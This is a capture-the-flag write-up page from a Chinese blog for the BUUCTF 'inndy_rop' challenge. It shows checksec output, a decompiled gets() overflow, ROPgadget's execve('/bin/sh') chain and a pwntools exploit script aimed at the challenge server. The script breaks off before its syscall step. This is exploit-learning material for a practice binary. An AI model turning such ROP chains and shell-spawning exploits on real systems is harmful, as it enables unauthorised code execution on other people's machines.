@@ -1,0 +1,1009 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="inndy_rop--mprotect函数, Matrix">
+    <meta name="description" content="checksecmatrix@ubuntu:~/PWN/BUU$ checksec rop
+[*] &#39;/home/matrix/PWN/BUU/rop&#39;
+    Arch:     i386-32-little
+    RELRO:    ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>inndy_rop--mprotect函数 | Matrix</title>
+    <link rel="icon" type="image/jpeg" href="/medias/matrix.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/matrix.jpg" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">Matrix</span>
+                    </a>
+                </div>
+                
+
+<a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/matrix.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Matrix</div>
+        <div class="logo-desc">
+            
+            Fight Against Your Fate!
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        inndy_rop--mprotect函数
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/BUU-PWN/" target="_blank">
+                                <span class="chip bg-color">BUU-PWN</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
+                                CTF-PWN
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-09-27
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        1.4k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        7 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ checksec rop
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/BUU/rop'</span>
+    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little
+    RELRO<span class="token operator">:</span>    Partial RELRO
+    Stack<span class="token operator">:</span>    No canary found
+    NX<span class="token operator">:</span>       NX enabled
+    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>
+    只有NX开启
+<span class="token punctuation">.</span>/rop
+asdassssssssssssssss
+Segmentation <span class="token function">fault</span> <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span></code></pre>
+<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c">_BYTE <span class="token operator">*</span><span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>
+
+  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>刚打开IDA就被一大堆函数给吓到了，这应该就是静态编译的程序所以程序不会调用libc库，直接在二进制文件中实现函数。</strong></p>
+<pre class=" language-java"><code class="language-java">$file rop
+rop<span class="token operator">:</span> ELF <span class="token number">32</span><span class="token operator">-</span>bit LSB executable<span class="token punctuation">,</span> Intel <span class="token number">80386</span><span class="token punctuation">,</span> version <span class="token function">1</span> <span class="token punctuation">(</span>GNU<span class="token operator">/</span>Linux<span class="token punctuation">)</span><span class="token punctuation">,</span> statically linked<span class="token punctuation">,</span> <span class="token keyword">for</span> GNU<span class="token operator">/</span>Linux <span class="token number">2.6</span><span class="token punctuation">.</span><span class="token number">32</span><span class="token punctuation">,</span> statically 静态编译</code></pre>
+<p>静态编译我之前也就听过而已，这是第一次遇到，没办法就去看大佬的文章了。</p>
+<h3 id="Ropgadget-–ropchain-直接利用程序中的片段拼凑rop链。"><a href="#Ropgadget-–ropchain-直接利用程序中的片段拼凑rop链。" class="headerlink" title="Ropgadget –ropchain 直接利用程序中的片段拼凑rop链。"></a>Ropgadget –ropchain 直接利用程序中的片段拼凑rop链。</h3><p>ROPgadget –binary rop –ropchain</p>
+<pre class=" language-java"><code class="language-java">ROP chain generation
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+<span class="token operator">-</span> Step <span class="token number">1</span> <span class="token operator">--</span> Write<span class="token operator">-</span>what<span class="token operator">-</span>where gadgets
+
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x8050cc5</span> mov dword ptr <span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">,</span> edi <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x8048433</span> pop esi <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x8048480</span> pop edi <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> Can<span class="token string">'t find the '</span>xor edi<span class="token punctuation">,</span> edi<span class="token string">' gadget. Try with another '</span>mov <span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> r'
+
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x805466b</span> mov dword ptr <span class="token punctuation">[</span>edx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x806ecda</span> pop edx <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80b8016</span> pop eax <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80492d3</span> xor eax<span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret
+
+<span class="token operator">-</span> Step <span class="token number">2</span> <span class="token operator">--</span> Init syscall number gadgets
+
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80492d3</span> xor eax<span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x807a66f</span> inc eax <span class="token punctuation">;</span> ret
+
+<span class="token operator">-</span> Step <span class="token number">3</span> <span class="token operator">--</span> Init syscall arguments gadgets
+
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80481c9</span> pop ebx <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80de769</span> pop ecx <span class="token punctuation">;</span> ret
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x806ecda</span> pop edx <span class="token punctuation">;</span> ret
+
+<span class="token operator">-</span> Step <span class="token number">4</span> <span class="token operator">--</span> Syscall gadget
+
+    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x806c943</span> <span class="token keyword">int</span> <span class="token number">0x80</span>
+
+<span class="token operator">-</span> Step <span class="token number">5</span> <span class="token operator">--</span> Build the ROP chain  #这里可以直接复制过去做payload了
+
+    #<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>env python2
+    # execve generated by ROPgadget
+
+    from struct <span class="token keyword">import</span> pack
+
+    # Padding goes here
+    p <span class="token operator">=</span> <span class="token string">''</span>
+
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> # pop edx <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> # pop eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token string">'/bin'</span>
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> # mov dword ptr <span class="token punctuation">[</span>edx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> # pop edx <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">4</span>
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> # pop eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token string">'//sh'</span>
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> # mov dword ptr <span class="token punctuation">[</span>edx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> # pop edx <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">8</span>
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> # xor eax<span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> # mov dword ptr <span class="token punctuation">[</span>edx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> # pop ebx <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080de769</span><span class="token punctuation">)</span> # pop ecx <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">8</span>
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> # pop edx <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">8</span>
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> # xor eax<span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret
+    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret</code></pre>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'rop'</span><span class="token punctuation">)</span>
+
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26186</span><span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
+p <span class="token operator">+=</span> <span class="token string">'/bin'</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 4</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
+p <span class="token operator">+=</span> <span class="token string">'//sh'</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ebx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080de769</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ecx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
